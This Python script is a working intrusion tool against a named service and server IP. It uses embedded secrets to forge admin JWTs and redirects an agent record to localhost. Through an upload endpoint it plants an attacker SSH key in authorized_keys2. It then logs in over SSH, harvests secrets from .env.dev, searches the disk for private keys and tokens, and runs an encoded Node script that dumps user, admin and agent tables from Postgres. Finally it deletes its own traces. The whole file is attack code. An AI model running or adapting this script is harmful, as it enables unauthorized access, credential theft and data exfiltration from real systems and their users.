#!/usr/bin/env python3
# i29220 round B: re-upload key, REAL ssh as ubuntu, harvest .env.dev + PG accounts + target keys, then cleanup
import os, sys, json, time, base64, hmac, hashlib, subprocess
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29220b"
DO_CLEANUP = True

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=90, verbose=False):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15"]
    if verbose: args += ["-v"]
    else: args += ["-o", "LogLevel=ERROR"]
    args += ["ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

# ---------- P0 health ----------
R("P0_health", call("/api/health", timeout=20))

# ---------- P1 original DTO ----------
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
orig = {}
for a in agents:
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser"),
                "workspacePath": a.get("workspacePath"), "customer": a.get("customer"), "status": a.get("status")}
R("P1_admin", {"code": r["code"], "n": len(agents), "target": orig})

# ---------- P2 patch host->127.0.0.1 + ssh_user->ubuntu ----------
pr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
pj = jl(pr["body"]) or {}
R("P2_patch", {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser")})

# ---------- P3 keygen + upload authorized_keys2 ----------
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
R("P3_pub", pub)
open("/tmp/authorized_keys2", "w").write(pub + "\n")

sess = forge(OWNER)
def upload(path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Cookie: session=" + sess,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:800]}

R("P4_upload_key", upload("/home/ubuntu/.ssh", "/tmp/authorized_keys2", "authorized_keys2"))

# ---------- P5 restore agent immediately ----------
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")},
          timeout=25, maxlen=3000)
R("P5_restore", {"code": rr["code"], "ip": (jl(rr["body"]) or {}).get("ip"),
                 "sshUser": (jl(rr["body"]) or {}).get("sshUser")})

# ---------- P6 REAL ssh login ----------
rc, out, err = ssh("id; hostname; whoami; uname -a; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no); echo HOME:$HOME", timeout=40, verbose=True)
R("P6_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:1200], "err": err.decode("utf-8", "replace")[-1500:]})
if b"uid=" not in out:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True)
    sys.exit(0)

# ---------- P7 .env.dev secrets (current) ----------
cmd = ("set -a; . /opt/lumii-prod/.env.dev 2>/dev/null; set +a; "
       "env | grep -Ei 'JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|TURN_PROOF|TURN_TICKET|SAAS|APP_GATEWAY|PUSH_SECRET|KB_RELAY|ZOOFI|CLOUDFLARE|CF_|AKID|LTAI|AKIA|dckr_pat_|SECRET|PASSWORD|_KEY|TOKEN' "
       "| sort | head -140")
rc, out, err = ssh(cmd, timeout=40)
R("P7_env", {"rc": rc, "out": out.decode("utf-8", "replace")[:8000]})

# ---------- P8 targeted key / zoofi greps (bounded) ----------
cmd = (
 "echo '=== HEX64 ==='; timeout 90 grep -rEaoi --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist '0x[0-9a-f]{64}' /home/ubuntu /opt/lumii-prod 2>/dev/null | sort -u | head -200\n"
 "echo '=== ZOOFI_INDEX ==='; timeout 60 grep -rIl --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist -i 'zoofi-index\\|zoofi_index' /home/ubuntu /opt/lumii-prod 2>/dev/null | head -30\n"
 "echo '=== TARGET_MATCH ==='; timeout 60 grep -rIli --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist 'c56f7063fd6d199ccc443dbbf4283be602d46343\\|fe18aa1efa652660f36ab84f122cd36108f903b6' /home/ubuntu /opt/lumii-prod 2>/dev/null | head -30\n"
 "echo '=== BEGIN_KEY ==='; timeout 60 grep -rIl --exclude-dir=node_modules --exclude-dir=.git -e 'BEGIN OPENSSH PRIVATE KEY' -e 'BEGIN RSA PRIVATE KEY' -e 'BEGIN EC PRIVATE KEY' /home/ubuntu /opt/lumii-prod 2>/dev/null | head -40\n"
 "echo '=== CF_TUNNEL ==='; ls -la /home/ubuntu/.cloudflared /etc/cloudflared 2>/dev/null; grep -rIl -i 'cloudflared\\|trycloudflare\\|TunnelID\\|tunnel:' /home/ubuntu/.cloudflared /etc/cloudflared 2>/dev/null | head\n"
)
rc, out, err = ssh(cmd, timeout=200)
R("P8_grep", {"rc": rc, "out": out.decode("utf-8", "replace")[:14000]})

# ---------- P9 PG accounts dump via node ----------
node_js = r"""
const fs=require('fs');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1];
if(url)url=url.trim();
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();
 const q=async(s)=>{try{const r=await c.query(s);return r.rows;}catch(e){return [{err:String(e.message).slice(0,120)}];}};
 const out={};
 const tabs=await q("select table_name from information_schema.tables where table_schema='public' order by 1");
 out.tables=Array.isArray(tabs)?tabs.map(x=>x.table_name):tabs;
 const icols=await q("select table_name,column_name from information_schema.columns where table_schema='public' and (column_name ~* 'account|passw|secret|token|ssh|private|credential|dsn|_env|apikey|api_key') order by table_name,column_name");
 out.interest_cols=icols;
 for(const t of ['users','admins','user_agents','agents','runtimes','projects','project_envs','project_accounts','members','organizations','project_members','orgs','environments']){
   const cnt=await q("select count(*)::int as n from "+t);
   if(cnt&&cnt[0]&&cnt[0].err){out['n_'+t]=cnt[0].err;continue;}
   out['n_'+t]=cnt;
 }
 out.users=await q("select * from users limit 60");
 out.admins=await q("select * from admins limit 30");
 out.agents=await q("select id,name,customer,host,ssh_user,ssh_port,status from agents limit 60");
 out.runtimes=await q("select * from runtimes limit 40");
 await c.end();
 console.log(JSON.stringify(out).slice(0,26000));
})().catch(e=>console.log('ERR',String(e).slice(0,400)));
"""
b64 = base64.b64encode(node_js.encode()).decode()
cmd = "cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pgprobe29220b.cjs && timeout 70 node /tmp/pgprobe29220b.cjs" % b64
rc, out, err = ssh(cmd, timeout=100)
R("P9_pg", {"rc": rc, "out": out.decode("utf-8", "replace")[:26000], "err": err.decode("utf-8", "replace")[:300]})

# ---------- P10 cleanup our artifacts (authorized_keys2 + poc file) ----------
if DO_CLEANUP:
    cmd = ("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; "
           "unlink /home/ubuntu/lumii_poc_29220.txt 2>/dev/null; "
           "ls -la /home/ubuntu/.ssh/authorized_keys2 2>&1 | head -1; echo CLEANED")
    rc, out, err = ssh(cmd, timeout=30)
    R("P10_cleanup", {"rc": rc, "out": out.decode("utf-8", "replace")[:600]})

R("P99_done", "roundB complete")
print("DONE", flush=True)
